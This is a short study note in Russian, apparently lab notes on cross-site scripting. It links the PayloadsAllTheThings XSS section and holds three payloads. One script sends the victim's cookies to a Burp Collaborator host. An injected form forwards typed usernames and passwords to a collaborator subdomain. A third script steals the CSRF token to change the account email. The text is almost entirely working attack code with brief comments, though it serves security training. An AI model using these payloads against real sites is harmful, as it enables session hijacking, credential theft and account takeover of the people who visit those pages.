***
[PayloadsAllTheThings/XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#cross-site-scripting)
***
# Навигация

> [[XSS#Exploiting cross-site scripting to steal cookies|1. Exploiting cross-site scripting to steal cookies]]
***
# Exploiting cross-site scripting to steal cookies

[PayloadsAllTheThings - XSS - data-grabber-for-xs](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss)
Пример в CORS: 
```
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```
### Exploiting cross-site scripting to capture passwords
Здесь представлена форма, которая ожидает ввода логина и пароля, и сказу отправляет из в коллаборатор.
```
<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method:'POST', mode:'no-cors', body:username.value+':'+this.value });">
```
### Exploiting XSS to perform CSRF
**Пользователь**, зашедший на страницу с **xss**, направит запрос и свой **csrf токен** на смену **email** на **'/my-account/change-email'**, если **токен** висит в **html**.
```
<script>  
var req = new XMLHttpRequest();  
req.onload = handleResponse;  
req.open('get','/my-account',true);  
req.send();  
function handleResponse() {  
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
var changeReq = new XMLHttpRequest();  
changeReq.open('post', '/my-account/change-email', true);  
changeReq.send('csrf='+token+'&email=test@test.com')  
};  
</script>
```